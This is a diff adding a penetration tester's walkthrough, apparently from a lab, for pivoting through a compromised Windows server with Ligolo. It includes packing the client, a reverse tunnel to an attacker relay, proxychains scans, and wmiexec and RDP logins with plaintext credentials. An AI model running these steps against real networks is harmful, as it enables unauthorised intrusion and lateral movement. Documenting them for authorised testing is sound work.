@@ -1,0 +1,273 @@
+
+======================================================================================================
+Pivoting with Ligolo on a Windows server (basic example)
+======================================================================================================
+
+=> Github page "https://github.com/sysdream/ligolo"
+
+Ligolo is a simple and lightweight tool for establishing SOCKS5 or TCP tunnels from a reverse connection in complete safety (TLS certificate with elliptical curve).
+It is comparable to Meterpreter with Autoroute + Socks4a, but more stable and faster.
+
+
+Context
+--------
+During a penetration test, you managed to hack a vulnerable Internet-facing system (e.g. insecure website, misconfigured/unpatched Exchange server or Citrix server)
+and you are able to run OS commands on the underlying Windows server.
+This Windows server is located inside your client's internal network (protected by a firewall) and you want to establish a tunnel between your pentester machine 
+(e.g. Kali Linux VM in AWS) and this Windows server to be able to access to the internal network (like you were remotely connected with a VPN client).
+
+
+======================================================================================================
+Step 1 - Build the 2 Ligolo binaries (the localrelay and the client)
+======================================================================================================
+
+Follow instrcutions available in the Github page "https://github.com/sysdream/ligolo"
+
+Notes:
+======
+
+jeff@kali:~/Documents/Tools$ sudo apt-get install golang
+jeff@kali:~/Documents/Tools$ cd /home/jeff/go/
+jeff@kali:~/go$ mkdir src
+jeff@kali:~/go$ git clone https://github.com/sysdream/ligolo
+Cloning into 'ligolo'...
+remote: Enumerating objects: 27, done.
+<SNIP>
+
+jeff@kali:~/go$ cd ligolo
+jeff@kali:~/go/ligolo$ make dep
+go get -d -v ./...
+go: downloading github.com/hashicorp/yamux v0.0.0-20190923154419-df201c70410d
+go: downloading github.com/sirupsen/logrus v1.4.2
+go: downloading golang.org/x/net v0.0.0-20200202094626-16171245cfb2
+go: downloading github.com/konsorten/go-windows-terminal-sequences v1.0.1
+<SNIP>
+
+jeff@kali:~/go/ligolo$ 
+jeff@kali:~/go/ligolo$ make certs TLS_HOST=SupaPentester.com
+mkdir certs
+cd certs && go run `go env GOROOT`/src/crypto/tls/generate_cert.go -ecdsa-curve P256 -ed25519 -host SupaPentester.com
+2022/08/07 02:02:53 wrote cert.pem
+2022/08/07 02:02:53 wrote key.pem
+
+jeff@kali:~/go/ligolo$ make build
+<SNIP>
+jeff@kali:~/go/ligolo$ ls ./bin/
+ligolo  localrelay
+
+=> The 2 Ligolo binaries (ligolo & localrelay) are generated without error and are located in the folder './bin'.
+
+jeff@kali:~/go/ligolo$ make build-all
+gox -osarch="linux/amd64 linux/386 linux/arm windows/amd64 windows/386 darwin/amd64 darwin/386" -ldflags="-s -w -X main.tlsFingerprint=$(openssl x509 -fingerprint -sha256 -noout -in 'certs/cert.pem' | cut -d '=' -f2)" -gcflags="all=-trimpath=OPATH" -tags release -output "bin/ligolo_{{.OS}}_{{.Arch}}" ./cmd/ligolo
+/bin/sh: 1: gox: not found
+make: *** [Makefile:33: build-all] Error 127
+
+jeff@kali:~/go/ligolo$ sudo apt-get install gox
+<SNIP>
+
+jeff@kali:~/go/ligolo$ make build-all
+<SNIP>
+make: *** [Makefile:33: build-all] Error 2
+
+=> The 'build-all' function doesn't work so I added a command line in the 'Makfile' to generate without error the Ligolo binary for a Windows x64 OS.
+
+jeff@kali:~/go/ligolo$ make build-win64
+gox -osarch "windows/amd64" -ldflags "-s -w -X main.tlsFingerprint=$(openssl x509 -fingerprint -sha256 -noout -in 'certs/cert.pem' | cut -d '=' -f2)" -output "bin/Ligolowin64" ./cmd/ligolo
+Number of parallel builds: 1
+
+-->   windows/amd64: ligolo/cmd/ligolo
+##gox -osarch "windows/amd64" -ldflags "-s -w -X main.tlsFingerprint=$(openssl x509 -fingerprint -sha256 -noout -in 'certs/cert.pem' | cut -d '=' -f2)" -gcflags "all=-trimpath=OPATH" -tags release -output "bin/localrelaywin64" ./cmd/localrelay
+
+jeff@kali:~/go/ligolo$ ls ./bin/
+ligolo  Ligolowin64.exe  localrelay
+
+jeff@kali:~/go/ligolo$ cd ./bin/
+jeff@kali:~/go/ligolo/bin$ upx Ligolowin64.exe
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2020
+UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+   3591680 ->   1500160   41.77%    win64/pe     Ligolowin64.exe               
+
+Packed 1 file.
+
+jeff@kali:~/go/ligolo/bin$ ls -al
+total 8844
+drwxr-xr-x 2 jeff jeff    4096 Aug  7 02:32 .
+drwxr-xr-x 7 jeff jeff    4096 Aug  7 02:30 ..
+-rwxr-xr-x 1 jeff jeff 3694592 Aug  7 02:10 ligolo
+-rwxr-xr-x 1 jeff jeff 1500160 Aug  7 02:31 Ligolowin64.exe
+-rwxr-xr-x 1 jeff jeff 3850240 Aug  7 02:09 localrelay
+
+jeff@kali:~/go/ligolo/bin$ mv Ligolowin64.exe Ligolowin64upx.exe 
+
+
+======================================================================================================
+Step 2 - Set-up your attack server (e.g. a Kali Linux VM hosted in AWS)
+======================================================================================================
+
+1. Run the Ligolo 'localrelay' on your attack server 
+-----------------------------------------------------------
+
+jeff@kali:~/go/ligolo$ ./bin/localrelay -relayserver 0.0.0.0:8443 -localserver 127.0.0.1:1080 
+
+██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗
+██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗
+██║     ██║██║  ███╗██║   ██║██║     ██║   ██║
+██║     ██║██║   ██║██║   ██║██║     ██║   ██║
+███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝
+╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝
+              Local Input - Go - Local Output
+
+INFO[0000] Ligolo server started.                        localserver="127.0.0.1:1080" relayserver="0.0.0.0:8443"
+INFO[0005] New relay connection.                         remoteaddr="X.X.X.113:27984"
+INFO[0005] Session ping : 336.846Âµs                     
+INFO[0005] Session acquired. Starting relay.            
+INFO[0056] New proxy connection. Establishing new session. 
+INFO[0056] Yamux session established.             
+
+
+2. Configure Proxychains (socks5) 
+-----------------------------------------------------------
+
+=> You need to add 'socks5  127.0.0.1 1080' into the config file '/etc/proxychains.conf'
+
+jeff@kali:~/Documents/Tools$ sudo vi /etc/proxychains.conf 
+jeff@kali:~/Documents/Tools$ cat /etc/proxychains.conf 
+# proxychains.conf  VER 3.1
+#
+#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
+
+<SNIP>                                                                                                                                                                                                     
+                                                                                                                                                                                                                                           
+# ProxyList format                                                                                                                                                                                                                         
+#       type  host  port [user pass]                                                                                                                                                                                                       
+#       (values separated by 'tab' or 'blank')                                                                                                                                                                                             
+#                                                                                                                                                                                                                                          
+#                                                                                                                                                                                                                                          
+#        Examples:
+#
+#               socks5  192.168.67.78   1080    lamer   secret
+#               http    192.168.89.3    8080    justu   hidden
+#               socks4  192.168.1.49    1080
+#               http    192.168.39.93   8080
+#
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4  127.0.0.1 9050
+socks5  127.0.0.1 1080 
+
+
+======================================================================================================
+Step 3 - Upload and execute the Ligolo client on the compromised Windows server
+======================================================================================================
+
+Command to run with the Ligolo client 'ligolowin64upx.exe' on the compromised Windows server
+----------------------------------------------------------------------------------------------
+
+C:\Users\Administrator.PO718687\Documents\Tools-AD\Ligolo> ligolowin64upx.exe -relayserver <public-IP-of-your-attacker-server>:8443
+
+██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗
+██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗
+██║     ██║██║  ███╗██║   ██║██║     ██║   ██║
+██║     ██║██║   ██║██║   ██║██║     ██║   ██║
+███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝
+╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝
+              Local Input - Go - Local Output
+
+time="2022-08-07T02:52:47+02:00" level=info msg="Connecting to relay server..."
+time="2022-08-07T02:52:47+02:00" level=info msg="Waiting for connections...."
+time="2022-08-07T02:58:21+02:00" level=info msg="Accepted new connection !" active_sessions=1
+<SNIP>
+
+
+======================================================================================================================================
+Step 4 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with Ligolo to pivot to the internal network
+======================================================================================================================================
+
+Example 1 - Nmap port scans
+-------------------------------------------
+
+jeff@kali:~/Documents/Tools$ proxychains nmap -sT -n -p 445,3389 X.X.1.113
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-07 03:18 CEST
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.113:80-<--timeout
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.113:445-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.113:3389-<><>-OK
+Nmap scan report for X.X.1.113
+Host is up (1.5s latency).
+
+PORT     STATE SERVICE
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
+
+jeff@kali:~/Documents/Tools$ proxychains nmap -sT -n -p 445,3389 X.X.1.64
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-07 03:18 CEST
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.64:80-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.64:445-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.64:3389-<><>-OK
+Nmap scan report for X.X.1.64
+Host is up (0.0031s latency).
+
+PORT     STATE SERVICE
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
+
+
+Example 2 - wmiexec (impacket)
+-------------------------------------------
+
+jeff@kali:~/Documents/Tools$ proxychains impacket-wmiexec test-lab/administrator:Test1234@X.X.1.64
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.64:445-<><>-OK
+[*] SMBv3.0 dialect used
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.64:135-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.64:49154-<><>-OK
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>hostname
+SQLDBSRV
+
+C:\>whoami
+test-lab\administrator
+
+C:\>
+
+
+Example 3 - xfreerdp
+-------------------------------------------
+
+jeff@kali:~/Documents/Tools$ proxychains xfreerdp /f /u:administrator /p:Test1234 /v:X.X.1.64:3389
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-X.X.1.64:3389-<><>-OK
+[02:58:21:421] [7641:7642] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[02:58:21:421] [7641:7642] [WARN][com.freerdp.crypto] - CN = TEMP-SQLDB.Security-Test-Lab.Local
+[02:58:22:734] [7641:7642] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[02:58:22:734] [7641:7642] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[02:58:22:757] [7641:7642] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[02:58:22:757] [7641:7642] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[02:58:22:859] [7641:7642] [WARN][com.freerdp.client.x11] - xf_lock_x11_:       [1] recursive lock from xf_process_x_events
+[02:58:24:423] [7641:7642] [WARN][com.freerdp.client.x11] - xf_lock_x11_:       [1] recursive lock from xf_process_x_events
+[03:08:32:542] [7641:7642] [WARN][com.freerdp.client.x11] - xf_lock_x11_:       [1] recursive lock from xf_sw_end_paint
+[03:13:32:054] [7641:7642] [WARN][com.freerdp.client.x11] - xf_lock_x11_:       [1] recursive lock from xf_sw_end_paint
+[03:13:36:297] [7641:7642] [WARN][com.freerdp.client.x11] - xf_lock_x11_:       [1] recursive lock from xf_process_x_events
+[03:13:42:421] [7641:7642] [WARN][com.freerdp.client.x11] - xf_lock_x11_:       [1] recursive lock from xf_process_x_events
+[03:13:42:761] [7641:7642] [WARN][com.freerdp.client.x11] - xf_lock_x11_:       [1] recursive lock from xf_process_x_events
+
+=> The RDP connection works well.
+
